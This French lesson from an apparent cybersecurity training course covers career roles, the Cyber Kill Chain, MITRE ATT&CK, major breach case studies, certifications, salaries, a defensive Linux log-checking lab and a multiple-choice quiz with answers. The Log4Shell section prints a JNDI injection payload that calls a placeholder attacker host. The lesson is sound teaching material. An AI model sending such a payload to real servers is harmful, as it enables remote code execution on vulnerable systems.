# Jour J0I — Le Métier d'Expert Cybersécurité : Gardien du Monde Numérique

> [!NOTE]
> **SEMESTRE 0 — PARCOURS D'INITIATION ET SOCLE DE PRÉ-REQUIS ABSOLUS (J0a–J0o)**
> Cette leçon explore les métiers de la cybersécurité : Red Team, Blue Team, GRC, DFIR, SOC. Vous découvrirez les domaines d'expertise, les certifications clés, les salaires nord-américains et comment PARADIS IT vous prépare directement à ces rôles.

---

## 🎯 Objectifs de la Leçon

- 🔴🔵 Comprendre les grandes familles de métiers en cybersécurité (Red/Blue/Purple Team).
- 🗺️ Explorer la Cyber Kill Chain et le framework MITRE ATT&CK.
- 📜 Maîtriser la roadmap des certifications (Security+, OSCP, CISSP).
- 💰 Connaître les salaires réels par rôle sur le marché nord-américain.
- 🎓 Comprendre comment les 600 jours PARADIS IT alignent avec ces certifications.

---

## 🖼️ La Guerre Numérique

![Cybersécurité](https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800)

---

## 📖 1. La Cybersécurité : Une Guerre Permanente

### 1.1 Narration & Intuition — Le Champ de Bataille Invisible

Pendant que vous lisez ces lignes, des milliers de cyberattaques sont en cours dans le monde. Des hackers automatisés testent des millions de mots de passe par seconde. Des ransomwares chiffrent les fichiers d'hôpitaux. Des espions étatiques infiltrent des ministères. Des fraudeurs volent des données de cartes de crédit.

Et de l'autre côté, une armée d'experts en cybersécurité surveille, défend, traque et contre-attaque.

La cybersécurité n'est pas un film de science-fiction. C'est la réalité quotidienne de toute organisation connectée à internet. Chaque entreprise, chaque gouvernement, chaque hôpital est une cible potentielle. La question n'est plus **si** une organisation sera attaquée, mais **quand** — et si elle sera prête.

### 1.2 Les Chiffres qui Font Réfléchir

- **8 000 milliards USD** : Coût annuel des cyberattaques dans le monde (2023)
- **2 200 cyberattaques par jour** dans le monde
- **280 jours** : Temps moyen pour détecter une intrusion dans un réseau d'entreprise
- **4,35 millions USD** : Coût moyen d'une violation de données (IBM 2022)
- **Colonial Pipeline (2021)** : 4,4 millions USD payés en Bitcoin par une entreprise d'énergie américaine
- **Log4Shell (2021)** : 800+ millions de systèmes vulnérables simultanément

---

## 📖 2. La Carte des Métiers en Cybersécurité

### 2.1 Red Team vs Blue Team vs Purple Team

```
╔══════════════════════════════════════════════════════════════════════╗
║                    LE MODÈLE RED/BLUE/PURPLE                         ║
╠══════════════════╦═══════════════════════╦═══════════════════════════╣
║  🔴 RED TEAM     ║  🔵 BLUE TEAM          ║  🟣 PURPLE TEAM            ║
║  (Attaquant)     ║  (Défenseur)           ║  (Collaboration)          ║
╠══════════════════╬═══════════════════════╬═══════════════════════════╣
║ Pentester        ║ Analyste SOC (L1/L2/L3)║ Security Engineer         ║
║ Red Team Operator║ Incident Responder     ║ Threat Intelligence       ║
║ Bug Bounty Hunter║ Threat Hunter          ║ Vulnerability Manager     ║
║ Exploit Developer║ DFIR Analyst           ║ Security Architect        ║
║ Social Engineer  ║ SIEM Engineer          ║ DevSecOps Engineer        ║
╚══════════════════╩═══════════════════════╩═══════════════════════════╝
```

### 2.2 Autres Domaines Clés

| Domaine | Rôles | Description |
|:---|:---|:---|
| **GRC** | Risk Analyst, Compliance Officer, CISO | Gouvernance, Risque, Conformité (RGPD, ISO27001, SOC2) |
| **AppSec** | Security Engineer, SAST/DAST Specialist | Sécurité des applications et du code source |
| **Cloud Security** | Cloud Security Architect | Sécurisation AWS/Azure/GCP (IAM, CSPM, CWPP) |
| **Cryptographie** | Cryptographer, PKI Engineer | Chiffrement, certificats TLS, PKI |
| **OT/ICS Security** | ICS Security Analyst | Sécurité des infrastructures industrielles critiques |

---

## 📖 3. La Cyber Kill Chain — Comment Pense un Attaquant

### 3.1 Le Modèle Lockheed Martin (2011)

La **Cyber Kill Chain** est un modèle créé par Lockheed Martin pour décrire les étapes d'une attaque informatique sophistiquée. Comprendre ces étapes permet aux défenseurs d'intervenir à chaque phase.

```
PHASE 1 : RECONNAISSANCE
  → L'attaquant collecte des informations sur la cible
  → Outils : Shodan, OSINT, LinkedIn scraping, whois, nmap
  → Exemple : "Cette entreprise utilise Apache 2.4.49 — version vulnérable"

PHASE 2 : WEAPONIZATION (Armement)
  → Création du malware ou de l'exploit
  → Exemple : Création d'un PDF malveillant exploitant une faille Adobe Reader

PHASE 3 : DELIVERY (Livraison)
  → Envoi de l'attaque vers la cible
  → Vecteurs : Email de phishing, lien malveillant, clé USB, watering hole

PHASE 4 : EXPLOITATION
  → Exécution du code malveillant sur la machine cible
  → Exemple : La victime ouvre le PDF → l'exploit s'exécute → accès initial

PHASE 5 : INSTALLATION
  → Installation d'une backdoor persistante
  → Exemple : Création d'un service systemd malveillant, modification de .bashrc

PHASE 6 : COMMAND & CONTROL (C2)
  → La machine infectée se connecte au serveur de contrôle de l'attaquant
  → Communication chiffrée pour éviter la détection

PHASE 7 : ACTIONS ON OBJECTIVES
  → L'attaquant atteint son objectif final :
  → Vol de données, chiffrement ransomware, espionnage, sabotage
```

### 3.2 MITRE ATT&CK Framework

Le **MITRE ATT&CK** est la référence mondiale pour décrire les Tactiques, Techniques et Procédures (TTP) des attaquants. Disponible sur https://attack.mitre.org, il référence plus de 400 techniques utilisées par des groupes APT réels.

```
Exemples de Techniques ATT&CK :

T1566.001 — Spearphishing avec pièce jointe (Delivery)
T1059.004 — Unix Shell (Execution)
T1078     — Valid Accounts (Privilege Escalation)
T1070.004 — File Deletion (Defense Evasion)
T1071.001 — Web Protocols (Command and Control)
T1486     — Data Encrypted for Impact (Ransomware)
```

---

## 📖 4. Études de Cas Réels — Apprendre des Grandes Attaques

### 4.1 SolarWinds (2020) — L'Attaque de la Chaîne d'Approvisionnement

**Qui :** APT29 (Cozy Bear) — Renseignement militaire russe (SVR)
**Cible :** 18 000 organisations dont Microsoft, FireEye, le Pentagone et 9 agences gouvernementales américaines
**Méthode :** Compromission du pipeline de build de SolarWinds → insertion de code malveillant dans les mises à jour Orion

**Leçons pour le Blue Team :**
- Surveiller l'intégrité des chaînes d'approvisionnement logicielle
- Implémenter des contrôles SBOM (Software Bill of Materials)
- Détecter les communications C2 inhabituelles (même depuis des logiciels légitimes)

### 4.2 Colonial Pipeline (2021) — Ransomware sur Infrastructure Critique

**Qui :** DarkSide (groupe cybercriminel)
**Cible :** Colonial Pipeline — 45% du carburant de la côte Est américaine
**Méthode :** Accès via un mot de passe VPN compromis (pas de MFA!)
**Impact :** 4,4 millions USD de rançon, pénuries d'essence dans 17 États

**Leçons pour le Blue Team :**
- MFA (Multi-Factor Authentication) OBLIGATOIRE sur tous les accès VPN
- Segmentation réseau OT/IT pour isoler les infrastructures critiques
- Plan de réponse aux incidents testé régulièrement

### 4.3 Log4Shell CVE-2021-44228 — La Vulnérabilité du Siècle

**Qui :** Découvert par Chen Zhaojun (Alibaba), exploité massivement
**Quoi :** Exécution de code arbitraire à distance dans Apache Log4j 2
**Impact :** 800 millions+ de systèmes exposés (serveurs Minecraft, Apple iCloud, Twitter, Amazon...)
**CVSS Score :** 10.0/10.0 (critique absolu)

```bash
# Payload d'attaque Log4Shell (à des fins éducatives uniquement)
# ${jndi:ldap://attacker.com/exploit}
# → Log4j cherche à charger une classe Java depuis ldap://attacker.com
# → Exécution de code arbitraire sur le serveur victime

# Détection Log4Shell dans les logs (Blue Team)
grep -r "jndi:" /var/log/ 2>/dev/null
# Si des résultats apparaissent : système potentiellement attaqué!
```

---

## 📖 5. Roadmap des Certifications Cybersécurité

### 5.1 Le Chemin vers l'Expertise

```
DÉBUTANT (Semestres 0-3 PARADIS IT)
  ┌─────────────────────────────────────────────────────┐
  │  CompTIA IT Fundamentals+ (ITF+)                    │
  │  CompTIA A+                                         │
  │  CompTIA Network+                                   │
  │  Linux Foundation Certified IT Associate (LFCA)     │
  └─────────────────────────────────────────────────────┘
                            ↓
INTERMÉDIAIRE (Semestres 4-7)
  ┌─────────────────────────────────────────────────────┐
  │  CompTIA Security+ SY0-701 ← Standard RH mondial    │
  │  AWS Cloud Practitioner / Azure Fundamentals        │
  │  Certified Ethical Hacker (CEH)                     │
  │  GCIA / GCIH (GIAC)                                 │
  └─────────────────────────────────────────────────────┘
                            ↓
AVANCÉ (Semestres 8-12)
  ┌─────────────────────────────────────────────────────┐
  │  OSCP (Offensive Security) ← Graal du pentest       │
  │  AWS Security Specialty                             │
  │  CISSP (Management stratégique)                     │
  │  CISM / CISA (Gouvernance)                          │
  │  GREM / GXPN / GWAPT (GIAC Expert)                 │
  └─────────────────────────────────────────────────────┘
                            ↓
EXPERT / LEADERSHIP
  ┌─────────────────────────────────────────────────────┐
  │  CISO (Chief Information Security Officer)          │
  │  GSE (GIAC Security Expert — moins de 1000 dans le  │
  │       monde)                                        │
  └─────────────────────────────────────────────────────┘
```

### 5.2 Salaires Cybersécurité — Marché Nord-Américain 2024

| Rôle | Canada (CAD) | USA (USD) |
|:---|:---:|:---:|
| **Analyste SOC Niveau 1** | 55 000–75 000 | 50 000–70 000 |
| **Analyste SOC Niveau 2/3** | 75 000–105 000 | 75 000–110 000 |
| **Pentester Junior** | 70 000–95 000 | 70 000–100 000 |
| **Pentester Senior (OSCP)** | 100 000–145 000 | 110 000–160 000 |
| **Cloud Security Engineer** | 110 000–155 000 | 120 000–180 000 |
| **Security Architect** | 130 000–185 000 | 140 000–210 000 |
| **CISO (PME)** | 150 000–220 000 | 160 000–280 000 |
| **CISO (Grande Entreprise)** | 250 000–400 000 | 300 000–500 000 |

---

## 🧪 Atelier Pratique : Premières Analyses de Sécurité

```bash
# 1. Vérifier les tentatives de connexion SSH échouées
sudo grep "Failed password" /var/log/auth.log | tail -10
# Output attendu: IP d'attaquants ayant tenté de se connecter

# 2. Voir les connexions SSH réussies
sudo grep "Accepted password\|Accepted publickey" /var/log/auth.log | tail -5
# Output attendu: Connexions légitimes avec IP et username

# 3. Lister les ports ouverts sur votre machine (vue attaquant)
sudo nmap -sS -sV -O localhost 2>/dev/null | grep "open\|OS"
# Output attendu: Liste des ports ouverts et services détectés

# 4. Vérifier les fichiers SUID (escalade de privilèges potentielle)
find / -perm -4000 -type f 2>/dev/null
# Output attendu: Fichiers avec le bit SUID (/usr/bin/sudo, /usr/bin/passwd...)

# 5. Voir les utilisateurs avec shell de connexion (surface d'attaque)
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1,3,6,7
# Output: Utilisateurs actifs avec leur UID, home et shell

# 6. Vérifier les règles firewall actives
sudo iptables -L -n -v --line-numbers 2>/dev/null | head -20
# Ou avec ufw (Ubuntu)
sudo ufw status verbose

# 7. Chercher des fichiers modifiés dans les dernières 24h (forensics basique)
find /etc /bin /usr/bin -newer /tmp -type f 2>/dev/null | head -10
```

---

## ⚠️ Erreurs Fréquentes & Pièges

> [!WARNING]
> **Erreur #1 : Penser que la cybersécurité c'est "trouver des bugs"**
> 80% du travail en cybersécurité est défensif (monitoring, détection, réponse). Seuls les pentesters et Red Teams font principalement de l'attaque — et toujours avec une autorisation écrite explicite.

> [!WARNING]
> **Erreur #2 : Ignorer la légalité des tests de sécurité**
> Scanner les ports ou tester les vulnérabilités d'un système sans autorisation écrite est **illégal** (Code criminel du Canada, Computer Fraud and Abuse Act aux USA). Toujours obtenir un "Scope of Work" signé avant tout test.

> [!WARNING]
> **Erreur #3 : Sous-estimer la GRC (Gouvernance, Risque, Conformité)**
> Les rôles GRC (CISO, Risk Manager, Compliance Officer) sont parmi les mieux payés en cybersécurité. Ne négligez pas cet aspect souvent perçu comme "moins technique".

> [!TIP]
> **Commencer par les CTF (Capture The Flag)**
> Les compétitions CTF sont le meilleur moyen de pratiquer légalement la cybersécurité offensive. Plateformes recommandées : **HackTheBox**, **TryHackMe**, **PicoCTF**, **Root-Me**. Créez un compte dès aujourd'hui.

---

## ❓ Banque de QCM — Test du Jour (8 Questions)

**Q1 : Que signifie "Red Team" dans le contexte de la cybersécurité ?**
- A) L'équipe qui gère la conformité réglementaire
- B) L'équipe qui simule des attaquants réels pour tester les défenses
- C) L'équipe de support informatique de niveau 1
- D) L'équipe en charge des sauvegardes

*Réponse : B — La Red Team (équipe rouge) simule des attaquants sophistiqués pour tester la robustesse des défenses d'une organisation.*

**Q2 : Quelle est la première phase de la Cyber Kill Chain de Lockheed Martin ?**
- A) Exploitation
- B) Weaponization (Armement)
- C) Reconnaissance
- D) Installation

*Réponse : C — La Reconnaissance est la phase initiale où l'attaquant collecte des informations sur la cible (OSINT, scanning, etc.).*

**Q3 : Quelle vulnérabilité de 2021 a touché Apache Log4j et obtenu un score CVSS de 10.0 ?**
- A) Heartbleed (CVE-2014-0160)
- B) EternalBlue (CVE-2017-0144)
- C) Log4Shell (CVE-2021-44228)
- D) Shellshock (CVE-2014-6271)

*Réponse : C — Log4Shell (CVE-2021-44228) est une vulnérabilité d'exécution de code à distance dans Apache Log4j 2, considérée comme l'une des plus graves de l'histoire.*

**Q4 : Quel est le principal facteur ayant permis l'attaque de Colonial Pipeline en 2021 ?**
- A) Un logiciel obsolète non patché depuis 10 ans
- B) L'absence de pare-feu sur les serveurs
- C) Un compte VPN sans authentification multi-facteurs (MFA)
- D) Une clé USB malveillante

*Réponse : C — Les attaquants ont accédé au réseau via un compte VPN compromis. L'absence de MFA (Multi-Factor Authentication) a permis l'intrusion avec un simple mot de passe volé.*

**Q5 : Que signifie l'acronyme SOC en cybersécurité ?**
- A) System Operations Center
- B) Security Operations Center
- C) Software Operations Console
- D) Secure Online Credentials

*Réponse : B — Le SOC (Security Operations Center) est le centre de surveillance de la sécurité, fonctionnant 24/7, qui détecte, analyse et répond aux incidents de sécurité.*

**Q6 : Quelle certification est considérée comme le "Graal" de la cybersécurité offensive (pentest) ?**
- A) CompTIA Security+
- B) CEH (Certified Ethical Hacker)
- C) OSCP (Offensive Security Certified Professional)
- D) CISSP

*Réponse : C — L'OSCP est la certification de référence pour le pentesting professionnel : elle nécessite de compromettre réellement des machines dans un lab sur 24h.*

**Q7 : Quel framework mondial référence plus de 400 techniques utilisées par des groupes APT réels, organisées en Tactiques ?**
- A) OWASP Top 10
- B) CIS Controls
- C) MITRE ATT&CK
- D) NIST Cybersecurity Framework

*Réponse : C — MITRE ATT&CK (Adversarial Tactics, Techniques & Common Knowledge) est la référence mondiale pour décrire le comportement des attaquants réels.*

**Q8 : Quel est l'ordre correct de la Cyber Kill Chain pour un attaquant ?**
- A) Exploitation → Reconnaissance → Delivery → Installation
- B) Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions
- C) C2 → Reconnaissance → Delivery → Exploitation
- D) Installation → Weaponization → Delivery → Exploitation

*Réponse : B — La Cyber Kill Chain suit 7 phases séquentielles : Reconnaissance, Armement, Livraison, Exploitation, Installation, C&C, Actions finales.*

---

## 📚 Ressources & Références

- **MITRE ATT&CK** (framework de référence) : https://attack.mitre.org
- **HackTheBox** (lab de hacking légal) : https://www.hackthebox.com
- **TryHackMe** (apprentissage cybersécurité guidé) : https://tryhackme.com
- **SANS Internet Storm Center** (menaces en temps réel) : https://isc.sans.edu
- **Have I Been Pwned** (vérifier si votre email est compromis) : https://haveibeenpwned.com
- **CVE Database** (vulnérabilités officielles) : https://cve.mitre.org
- **NIST Cybersecurity Framework** : https://www.nist.gov/cyberframework

---

*Semestre 0 — Module d'Initiation & Pré-requis Absolus PARADIS IT Masterclass*
